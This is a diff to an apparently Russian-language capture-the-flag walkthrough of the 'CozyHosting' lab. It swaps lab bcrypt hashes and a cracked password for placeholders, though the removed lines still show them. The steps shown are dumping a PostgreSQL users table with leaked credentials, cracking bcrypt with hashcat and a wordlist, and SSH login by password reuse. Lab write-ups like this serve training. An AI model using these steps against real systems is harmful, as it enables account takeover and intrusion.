@@ -25,12 +25,12 @@ Credential Leak (JAR → PostgreSQL)
 │   └── spring.datasource.password=<PASSWORD>
 ├── psql -h 127.0.0.1 -U postgres → \connect cozyhosting → SELECT * FROM users
 │   ├── kanderson:$2a$10$...
-│   └── admin:$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm
-└── hashcat -m 3200 → admin:manchesterunited
+│   └── admin:<BCRYPT_HASH>
+└── hashcat -m 3200 → admin:<PASSWORD>
 
 User Flag (Password Reuse)
 ├── /etc/passwd → josh
-├── ssh josh@10.129.229.88 → manchesterunited
+├── ssh josh@10.129.229.88 → <PASSWORD>
 └── cat user.txt → <USER_FLAG>
 
 Privilege Escalation (sudo ssh ProxyCommand)
@@ -180,19 +180,19 @@ SELECT * FROM users;
 
 **Результат:**
 ```
-kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
-admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
+kanderson | <BCRYPT_HASH> | User
+admin     | <BCRYPT_HASH> | Admin
 ```
 
 ## 10. Взлом bcrypt-хеша admin
 
 ```bash
-echo '$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm' > hash_file
+echo '<BCRYPT_HASH>' > hash_file
 
 hashcat hash_file -m 3200 /usr/share/wordlists/rockyou.txt
 ```
 
-**Результат:** `manchesterunited`
+**Результат:** `<PASSWORD>`
 
 ## 11. Password reuse - SSH как josh, user flag
 
@@ -203,7 +203,7 @@ josh:x:1003:1003::/home/josh:/usr/bin/bash
 
 ```bash
 ssh josh@10.129.229.88
-# password: manchesterunited
+# password: <PASSWORD>
 ```
 
 ```bash
